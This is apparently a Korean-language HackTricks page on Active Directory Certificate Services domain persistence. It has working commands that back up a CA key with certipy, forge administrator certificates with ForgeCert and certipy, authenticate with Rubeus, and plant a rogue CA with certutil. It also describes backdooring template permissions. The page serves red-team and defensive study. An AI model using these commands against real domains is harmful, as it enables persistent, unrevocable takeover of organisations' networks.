# AD CS 도메인 지속성

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기교를 공유**하세요.

</details>

**이것은 [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)**에서 공유된 도메인 지속성 기술 요약입니다. 자세한 내용은 해당 문서를 확인하세요.

## 도난된 CA 인증서로 인증서 위조 - DPERSIST1

인증서가 CA 인증서인지 어떻게 알 수 있나요?

인증서가 CA 인증서인지 확인하려면 다음 조건들이 충족되어야 합니다:

- 인증서는 CA 서버에 저장되어 있으며, 개인 키는 기계의 DPAPI에 의해 보호되거나 운영 체제가 지원하는 경우 TPM/HSM과 같은 하드웨어에 의해 보호됩니다.
- 인증서의 발급자와 주체 필드가 CA의 식별 이름과 일치합니다.
- "CA Version" 확장이 CA 인증서에만 존재합니다.
- 인증서에는 확장 키 사용 (EKU) 필드가 없습니다.

이 인증서의 개인 키를 추출하기 위해 CA 서버의 `certsrv.msc` 도구는 내장 GUI를 통해 지원되는 방법입니다. 그러나 이 인증서는 시스템 내에 저장된 다른 인증서와 다를 바가 없으므로 [THEFT2 기술](certificate-theft.md#user-certificate-theft-via-dpapi-theft2)과 같은 방법을 사용하여 추출할 수 있습니다.

다음 명령을 사용하여 Certipy를 통해 인증서와 개인 키를 얻을 수도 있습니다:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
`.pfx` 형식의 CA 인증서와 해당 개인 키를 획득한 후, [ForgeCert](https://github.com/GhostPack/ForgeCert)와 같은 도구를 사용하여 유효한 인증서를 생성할 수 있습니다:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
인증서 위조를 위해 대상 사용자는 Active Directory에서 활성화되어 인증이 가능해야 합니다. krbtgt와 같은 특수 계정에 대해서는 인증서 위조가 효과적이지 않습니다.
{% endhint %}

이 위조된 인증서는 지정된 종료 날짜까지 **유효**하며, 루트 CA 인증서가 **유효한** 한 (일반적으로 5에서 **10년 이상**) 유효합니다. 또한 **기기**에 대해서도 유효하므로 **S4U2Self**와 결합하여 공격자는 CA 인증서가 유효한 한 **도메인 기기**에 대한 영속성을 유지할 수 있습니다.\
또한, 이 방법으로 생성된 **인증서는 취소할 수 없습니다**. 왜냐하면 CA가 그들을 인식하지 못하기 때문입니다.

## 로그 CA 인증서 신뢰 - DPERSIST2

`NTAuthCertificates` 객체는 그 안에 하나 이상의 **CA 인증서**를 포함하도록 정의되어 있으며, Active Directory (AD)에서 사용합니다. 도메인 컨트롤러의 **검증 과정**은 인증 중인 **인증서**의 발급자 필드와 일치하는 항목을 `NTAuthCertificates` 객체에서 확인합니다. 일치하는 항목이 발견되면 인증이 진행됩니다.

자체 서명된 CA 인증서는 공격자가 이 AD 객체를 제어할 수 있는 경우 `NTAuthCertificates` 객체에 추가할 수 있습니다. 일반적으로, **Enterprise Admin** 그룹의 구성원과 **Domain Admins** 또는 **forest root의 도메인**의 **Administrators**에게만 이 객체를 수정할 권한이 부여됩니다. `certutil.exe`를 사용하여 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126` 명령을 실행하거나 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)을 사용하여 `NTAuthCertificates` 객체를 편집할 수 있습니다.

이 기능은 ForgeCert를 사용하여 인증서를 동적으로 생성하는 방법과 결합하여 사용할 때 특히 관련이 있습니다.

## 악성 구성 오류 - DPERSIST3

AD CS 구성 요소의 **보안 설명자 수정**을 통한 **영속성**을 위한 기회는 많습니다. "[Domain Escalation](domain-escalation.md)" 섹션에서 설명한 수정 사항은 권한이 상승된 공격자가 악의적으로 구현할 수 있습니다. 이는 다음과 같은 중요한 구성 요소에 "제어 권한" (예: WriteOwner/WriteDACL 등)을 추가하는 것을 포함합니다:

- **CA 서버의 AD 컴퓨터** 객체
- **CA 서버의 RPC/DCOM 서버**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`**의 **하위 AD 객체 또는 컨테이너** (예: Certificate Templates 컨테이너, Certification Authorities 컨테이너, NTAuthCertificates 객체 등)
- 기본적으로 또는 조직에서 **AD CS를 제어할 수 있는 AD 그룹** (예: 내장된 Cert Publishers 그룹 및 해당 구성원)

악의적인 구현의 예로, 도메인에서 **상승된 권한**을 가진 공격자가 **`User`** 인증서 템플릿에 **`WriteOwner`** 권한을 추가하는 것이 있습니다. 공격자는 해당 권한의 주체가 됩니다. 이를 악용하기 위해 공격자는 먼저 **`User`** 템플릿의 소유권을 자신에게 변경합니다. 이후에는 템플릿에서 **`ENROLLEE_SUPPLIES_SUBJECT`**를 활성화하기 위해 **`mspki-certificate-name-flag`**를 **1**로 설정하여 사용자가 요청에서 Subject Alternative Name을 제공할 수 있도록 합니다. 그런 다음, 공격자는 **템플릿**을 사용하여 **도메인 관리자** 이름을 대체 이름으로 선택하고 획득한 인증서를 인증에 사용할 수 있습니다.


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**을** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
